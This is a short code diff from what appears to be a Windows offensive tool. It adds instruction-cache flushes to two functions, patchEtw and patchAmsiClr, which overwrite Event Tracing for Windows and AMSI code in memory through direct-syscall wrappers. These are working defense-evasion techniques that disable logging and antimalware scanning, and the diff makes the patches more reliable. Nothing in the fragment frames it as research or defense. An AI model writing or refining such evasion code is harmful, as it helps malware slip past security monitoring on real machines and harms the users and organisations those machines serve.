@@ -303,6 +303,8 @@ int static inline patchEtw()
     
     WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, patchSize, nullptr);
 
+    FlushInstructionCache(GetCurrentProcess(), pEventWrite, patchSize);
+
     Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, oldprotect, &oldprotect);
 
     return 0;
@@ -455,6 +457,8 @@ int static inline patchAmsiClr()
     Sw3NtProtectVirtualMemory_(hProcess, &found, &dwSize, PAGE_READWRITE, &oldprotect);
     
     WriteProcessMemory(hProcess, found, (PVOID)NewBytes, 14, nullptr);
+
+    FlushInstructionCache(GetCurrentProcess(), found, 14);
 
     Sw3NtProtectVirtualMemory_(hProcess, &found, &dwSize, oldprotect, &oldprotect);
 
